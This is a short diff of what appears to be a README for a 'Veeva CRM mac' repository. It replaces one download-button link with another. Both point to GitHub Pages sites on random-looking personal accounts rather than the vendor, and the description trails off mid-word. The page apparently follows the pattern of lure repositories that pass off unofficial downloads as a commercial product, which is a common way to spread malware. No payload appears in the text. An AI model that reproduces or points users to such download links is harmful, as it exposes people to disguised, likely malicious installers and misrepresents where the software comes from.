@@ -2,7 +2,7 @@
 
 Veeva CRM mac on macOS — toolkit focused on life sciences crm, plus approved email and clm content with native integrations and Apple silicon performa
 
-[![Download Veeva CRM mac](https://img.shields.io/badge/Download-Veeva_CRM_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Veeva CRM mac](https://img.shields.io/badge/Download-Veeva_CRM_mac-blueviolet)](https://isabellaparillo70.github.io/.github/Veeva-CRM)
 
 ---
 
